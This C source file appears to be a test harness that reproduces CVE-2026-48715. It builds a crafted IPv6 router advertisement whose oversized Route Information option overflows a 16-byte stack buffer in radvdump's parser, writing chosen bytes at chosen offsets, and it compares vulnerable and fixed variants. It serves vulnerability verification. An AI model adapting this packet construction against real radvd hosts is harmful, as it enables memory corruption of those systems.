/* Direct-call harness for CVE-2026-48715 / GHSA-52px-gh9p-m379.
 * The ND_OPT_ROUTE_INFORMATION case body is a VERBATIM slice from the pinned
 * radvdump.c blobs; run.sh re-extracts it on every run. All surrounding
 * radvd plumbing (socket, logging, address formatting) is a recording stub.
 * No daemon, no listener, no network, no off-loopback access.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/icmp6.h>
#include <stdlib.h>

#define LOG_ERR 3
#define VERSION "harness"
#define DFLT_AdvRoutePreference 0
#ifndef ND_OPT_ROUTE_INFORMATION
#define ND_OPT_ROUTE_INFORMATION 24
#endif

/* radvd-internal layout, RFC 4191 section 2.3. */
struct nd_opt_route_info_local {
    uint8_t nd_opt_ri_type;
    uint8_t nd_opt_ri_len;
    uint8_t nd_opt_ri_prefix_len;
    uint8_t nd_opt_ri_flags_reserved;
    uint32_t nd_opt_ri_lifetime;
    struct in6_addr nd_opt_ri_prefix;
};

/* Everything the verbatim slice reads is a global: a 256-byte overflow of
 * the slice's local `addr` cannot corrupt the harness's own control state. */
static unsigned char g_msg[512];
static struct nd_router_advert *radvert;
static uint8_t *opt_str;
static int optlen;

#ifdef FIXED_VARIANT
#define VARIANT_NAME "fixed-068bde13"
#elif defined(REL20_VARIANT)
#define VARIANT_NAME "release-v2.20"
#elif defined(REL21_VARIANT)
#define VARIANT_NAME "release-v2.21"
#else
#define VARIANT_NAME "vuln-878ca6b"
#endif
static int orig_len;
static int edefs;
static char prefix_str[64];
static char addr_str[64];

static int g_flog_calls;
static int g_addrtostr_calls;
static unsigned char g_addr_obs[64];
static char g_flog_msg[160];
static char g_addr_first16[33];
static const char *g_mode;
static int g_ri_len;
static int g_packet_len;
static int g_reported;
static void report(void);

static void flog(int level, const char *fmt, ...) {
    va_list ap;
    g_flog_calls++;
    va_start(ap, fmt);
    vsnprintf(g_flog_msg, sizeof(g_flog_msg), fmt, ap);
    va_end(ap);
    printf("FLOG level=%d msg=%s\n", level, g_flog_msg);
}

static void addrtostr(const struct in6_addr *a, char *dst, size_t n) {
    static const char hex[] = "0123456789abcdef";
    unsigned i;
    g_addrtostr_calls++;
    memcpy(g_addr_obs, a, 16);
#ifndef NO_OOB_READ
    /* Deliberate observation of the stack bytes AFTER the 16-byte object.
     * Only in plain builds: ASan builds must not fault in the observer. */
    memcpy(g_addr_obs + 16, (const unsigned char *)a + 16, 48);
#endif
    for (i = 0; i < 16 && 2 * i + 1 < n; i++) {
        dst[2 * i] = hex[(a->s6_addr[i] >> 4) & 0xf];
        dst[2 * i + 1] = hex[a->s6_addr[i] & 0xf];
    }
    dst[2 * i < n ? 2 * i : n - 1] = '\0';
    for (i = 0; i < 16; i++) {
        g_addr_first16[2 * i] = hex[(a->s6_addr[i] >> 4) & 0xf];
        g_addr_first16[2 * i + 1] = hex[a->s6_addr[i] & 0xf];
    }
    g_addr_first16[32] = '\0';
    if (!g_reported) { report(); g_reported = 1; }
}

static void print_preferences(int p) { (void)p; }

/* The switch body below is re-extracted from the pinned blobs by run.sh. */
static void route_case(int total_len) {
    orig_len = total_len - (int)sizeof(struct nd_router_advert);
    opt_str = g_msg + sizeof(struct nd_router_advert);
    if (orig_len < 2) { printf("BAD_ORIG_LEN=%d\n", orig_len); return; }
    optlen = opt_str[1] << 3;
    if (optlen == 0 || optlen > orig_len) {
        printf("BAD_OPTLEN=%d orig=%d\n", optlen, orig_len);
        return;
    }
    printf("ENTER_ROUTE_CASE ri_len=%d optlen=%d orig_len=%d\n",
           opt_str[1], optlen, orig_len);
    switch (*opt_str) {
#ifdef FIXED_VARIANT
#include "fixed/route_case.inc"
#elif defined(REL20_VARIANT)
#include "rel20/route_case.inc"
#elif defined(REL21_VARIANT)
#include "rel21/route_case.inc"
#else
#include "vuln/route_case.inc"
#endif
    }
    /* One option is enough; return before touching any stack local that the
     * verbatim memcpy may have smeared. */
    return;
}

static void build_packet(int ri_len) {
    struct nd_opt_route_info_local *rinfo;
    int i;
    int copy = (ri_len > 1) ? (ri_len - 1) * 8 : 0;
    memset(g_msg, 0, sizeof(g_msg));
    g_msg[0] = ND_ROUTER_ADVERT;
    radvert = (struct nd_router_advert *)g_msg;
    opt_str = g_msg + sizeof(struct nd_router_advert);
    opt_str[0] = ND_OPT_ROUTE_INFORMATION;
    opt_str[1] = (uint8_t)ri_len;
    rinfo = (struct nd_opt_route_info_local *)opt_str;
    rinfo->nd_opt_ri_prefix_len = 0;
    rinfo->nd_opt_ri_flags_reserved = 0;
    rinfo->nd_opt_ri_lifetime = htonl(0xffffffffu);
    for (i = 0; i < copy && i < 256; i++)
        opt_str[8 + i] = 0x41;
    /* Chosen bytes at chosen destination offsets: dest offset k == source
     * opt_str[8 + k], because memcpy writes from nd_opt_ri_prefix. */
    if (copy > 17) opt_str[8 + 17] = 0x5a;
    if (copy > 33) opt_str[8 + 33] = 0x3c;
    if (copy > 24) opt_str[8 + 24] = 0x7a;
    if (copy > 63) opt_str[8 + 63] = 0x7e;
    if (copy > 40) opt_str[8 + 40] = 0x7b;
    edefs = 0;
}

static void report(void) {
    printf("\n");
    printf("VARIANT=%s MODE=%s RI_LEN=%d OPTLEN=%d PKT_LEN=%d\n",
           VARIANT_NAME, g_mode, g_ri_len, g_ri_len << 3, g_packet_len);
    printf("FLOG_CALLS=%d ADDRTOSTR_CALLS=%d\n", g_flog_calls, g_addrtostr_calls);
    printf("ADDR_FIRST16=%s\n", g_addr_first16);
    printf("OBS_OFFSET_0=%02x OBS_OFFSET_17=%02x OBS_OFFSET_24=%02x OBS_OFFSET_33=%02x OBS_OFFSET_40=%02x OBS_OFFSET_63=%02x\n",
           g_addr_obs[0], g_addr_obs[17], g_addr_obs[24], g_addr_obs[33], g_addr_obs[40], g_addr_obs[63]);
    printf("READY\n");
}

int main(int argc, char **argv) {
    g_mode = argc > 1 ? argv[1] : "arith";
    g_ri_len = argc > 2 ? atoi(argv[2]) : 33;
    setvbuf(stdout, NULL, _IONBF, 0);
    memset(g_addr_first16, '0', 32);

    if (!strcmp(g_mode, "arith")) {
        printf("RI_LEN=%d RFC_MAX=3 GATE=>1 ACCEPTED=%d\n",
               g_ri_len, g_ri_len > 1);
        printf("COPY_BYTES=%d DEST_BYTES=16 OVERFLOW_BYTES=%d\n",
               (g_ri_len - 1) * 8, (g_ri_len - 1) * 8 - 16);
        printf("READY\n");
        return 0;
    }
    if (g_ri_len < 1 || g_ri_len > 255) return 99;
    g_packet_len = (int)sizeof(struct nd_router_advert) + (g_ri_len << 3);
    build_packet(g_ri_len);
    route_case(g_packet_len);
    if (!g_reported) report();
    return 0;
}
